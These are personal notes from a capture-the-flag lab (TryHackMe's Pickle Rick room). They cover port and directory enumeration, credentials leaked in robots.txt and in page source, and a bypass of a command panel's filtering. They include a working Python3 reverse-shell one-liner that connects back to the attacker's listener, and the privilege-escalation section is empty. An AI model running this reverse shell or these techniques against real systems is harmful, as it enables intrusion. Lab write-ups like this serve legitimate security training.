https://tryhackme.com/room/picklerick

BoxIP = 10.10.233.219

**Basic Enumeration**
nmap -sC -sV -Pn -oN nmap_initial 10.10.233.219
-sC = common scripts
-sV = Versioning
-Pn = no pings
-oN output notation

**Open Ports**
Open 10.10.233.219:22
Open 10.10.233.219:80


**automated web enumeration**
nikto -h 10.10.233.219

gobuster dir -u http://10.10.233.219/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -x txt,php 
/assets
/portal.php
/robots.txt


**robots.txt**
Wubbalubbadubdub


**Page source points of interest**
homepage = 
 <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->
  
 **/protals.php**
 using the found username and the word from robots.txt grants us access to a command panel page
 
 
 **Initial Foothold**
 There is some filtering on the command pannel for concatonation and some other commands but using 'strings' command allows us to read files
 Ingredient 1 = mr. meeseek hair
 
 
 Using Netcat does not work but puttering around I found that python3 was usable on the system. Using revshells.com I grabbed a python3 reverse shell script
 export RHOST="10.9.2.110";export RPORT=9001;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
 
 and we popped a shell on a NC listener
 
 **PrivEsc**
 
 
 
  
